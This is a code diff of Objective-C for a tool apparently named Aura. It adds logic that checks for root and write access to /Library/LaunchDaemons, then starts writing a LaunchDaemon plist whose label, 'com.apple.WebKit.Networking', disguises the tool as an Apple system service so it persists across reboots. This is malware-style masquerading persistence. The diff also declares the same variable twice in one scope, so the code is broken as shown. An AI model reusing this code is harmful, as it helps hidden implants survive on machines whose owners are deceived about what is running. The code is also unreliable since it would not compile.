@@ -198,29 +198,37 @@
     // Check if running as root
     BOOL isRoot = [self isRootUser];
     if (!isRoot) {
-        NSLog(@"❌ Not running as root. Cannot persist as a LaunchDaemon.");
+        NSLog(@"❌ We're not running as root. Cannot persist Aura.");
         return NO;
     }
 
-    // Check if Launch Daemons exists first
-    NSString *plistPath = @"/Library/LaunchDaemons/com.apple.WebKit.Networking.plist";
-    NSLog(@"Writing to: %@", plistPath);
-    
+    /// Check if we can write to the LaunchDaemons directory by permissions
+    NSString *launchDaemonsDirectory = @"/Library/LaunchDaemons/";
+    if ([[NSFileManager defaultManager] isWritableFileAtPath:launchDaemonsDirectory]) {
+        NSLog(@"✅ We can write to the LaunchDaemons directory.");
+    } else {
+        NSLog(@"❌ We cannot write to the LaunchDaemons directory.");
+        return NO;
+    }
+
+    // 1. Create Launch Daemons if it does not exist
     BOOL isDirectory;
-    NSString *plistDirectory = @"/Library/LaunchDaemons/";
-    if (![[NSFileManager defaultManager] fileExistsAtPath:plistDirectory isDirectory:&isDirectory] || !isDirectory) {
+    NSString *launchDaemonsDirectory = @"/Library/LaunchDaemons/";
+    if (![[NSFileManager defaultManager] fileExistsAtPath:launchDaemonsDirectory isDirectory:&isDirectory] || !isDirectory) {
         NSError *directoryError = nil;
-        NSLog(@"Directory %@ does not exist, attempting to create it.", plistDirectory);
-        BOOL directoryCreated = [[NSFileManager defaultManager] createDirectoryAtPath:plistDirectory withIntermediateDirectories:YES attributes:nil error:&directoryError];
+        BOOL directoryCreated = [[NSFileManager defaultManager] createDirectoryAtPath:launchDaemonsDirectory withIntermediateDirectories:YES attributes:nil error:&directoryError];
 
         if (!directoryCreated) {
-            NSLog(@"❌ Failed to create LaunchDaemons/ at: %@. Error: %@", plistDirectory, directoryError);
+            NSLog(@"❌ Failed to create LaunchDaemons/ at: %@. Error: %@", launchDaemonsDirectory, directoryError);
             return NO;
         } else {
-            NSLog(@"✅ Successfully created LaunchDaemons/ at: %@", plistDirectory);
+            NSLog(@"✅ Successfully created LaunchDaemons/ at: %@", launchDaemonsDirectory);
         }
     }
 
+    
+    // Dynamically create the plist
+    // TODO: Get the execution path, get the shell path
     // Great! Now we'll write out the PLIST contents persisting Aura.
     NSDictionary *plistContents = @{
         @"Label": @"com.apple.WebKit.Networking",
